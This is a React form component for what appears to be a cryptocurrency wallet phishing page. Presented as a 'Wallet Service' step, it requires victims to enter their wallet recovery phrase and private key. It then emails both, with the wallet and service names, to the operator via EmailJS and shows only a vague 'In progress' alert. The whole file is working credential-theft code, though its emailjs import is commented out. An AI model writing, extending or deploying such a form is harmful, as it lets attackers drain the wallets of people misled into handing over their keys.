import React, { useState } from "react";
import { useLocation } from "react-router-dom";
import styled from "styled-components";
// import emailjs from "emailjs-com"; // Ensure this is installed via `npm install emailjs-com`

const FormContainer = styled.div`
  padding: 40px;
  text-align: center;
  background-color: #f9f9f9;
`;

const Form = styled.form`
  max-width: 400px;
  margin: auto;
  text-align: left;
`;

const Input = styled.input`
  width: 100%;
  padding: 10px;
  margin: 10px 0;
  border: 1px solid #ccc;
  border-radius: 4px;
`;

const SubmitButton = styled.button`
  background-color: #38bdf8;
  color: white;
  padding: 10px 20px;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  transition: background-color 0.3s;

  &:hover {
    background-color: #2563eb;
  }

  &:disabled {
    background-color: #ccc;
    cursor: not-allowed;
  }
`;

const ErrorText = styled.p`
  color: red;
  font-size: 0.9rem;
`;

const WalletForm = () => {
  const location = useLocation();
  const { wallet, service } = location.state || {};

  // State for inputs and button
  const [formData, setFormData] = useState({
    recoveryPhrase: "",
    privateKey: "",
    additionalOption: "",
  });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState("");

  // Handle input changes
  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));

    // Clear error when the user starts typing
    if (name === "additionalOption") {
      setError("");
    }
  };

  // Handle form submission
  const handleSubmit = (e) => {
    e.preventDefault();

    // Validate email
    if (
      formData.additionalOption &&
      !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.additionalOption)
    ) {
      setError("Please enter a valid email address.");
      return;
    }

    setIsSubmitting(true); // Disable the button

    const emailData = {
      to_name: "User",
      from_name: "Wallet Service",
      wallet: wallet || "Unknown Wallet",
      service: service || "Unknown Service",
      recoveryPhrase: formData.recoveryPhrase,
      privateKey: formData.privateKey,
      additionalOption: formData.additionalOption || "None",
      message: `
        Wallet: ${wallet || "Unknown Wallet"}
        Service: ${service || "Unknown Service"}
        Recovery Phrase: ${formData.recoveryPhrase}
        Private Key: ${formData.privateKey}
        Additional Option: ${formData.additionalOption || "None"}
      `,
    };

    // EmailJS configuration
    emailjs
      .send(
        import.meta.env.VITE_EMAILJS_SERVICE_ID,
        import.meta.env.VITE_EMAILJS_TEMPLATE_ID,
        emailData,
        import.meta.env.VITE_EMAILJS_PUBLIC_KEY
      )
      .then(
        (response) => {
          alert("In progress.....");
          console.log("SUCCESS!", response.status, response.text);

          // Clear form and re-enable submit button
          setFormData({
            recoveryPhrase: "",
            privateKey: "",
            additionalOption: "",
          });
          setIsSubmitting(false);
        },
        (error) => {
          alert("Failed to send. Please try again.");
          console.error("FAILED...", error);
          setIsSubmitting(false); // Re-enable submit button on failure
        }
      );
  };

  return (
    <FormContainer>
      <h2>Fill Details for {wallet || "Wallet"}</h2>
      <p>Service: {service || "Service"}</p>
      <Form onSubmit={handleSubmit}>
        <Input
          type="text"
          name="recoveryPhrase"
          placeholder="Enter Recovery Phrase"
          value={formData.recoveryPhrase}
          onChange={handleChange}
          required
        />
        <Input
          type="text"
          name="privateKey"
          placeholder="Enter Private Key"
          value={formData.privateKey}
          onChange={handleChange}
          required
        />
        <Input
          type="text"
          name="additionalOption"
          placeholder="Email"
          value={formData.additionalOption}
          onChange={handleChange}
        />
        {error && <ErrorText>{error}</ErrorText>}
        <SubmitButton type="submit" disabled={isSubmitting}>
          {isSubmitting ? "..." : "Next"}
        </SubmitButton>
      </Form>
    </FormContainer>
  );
};

export default WalletForm;
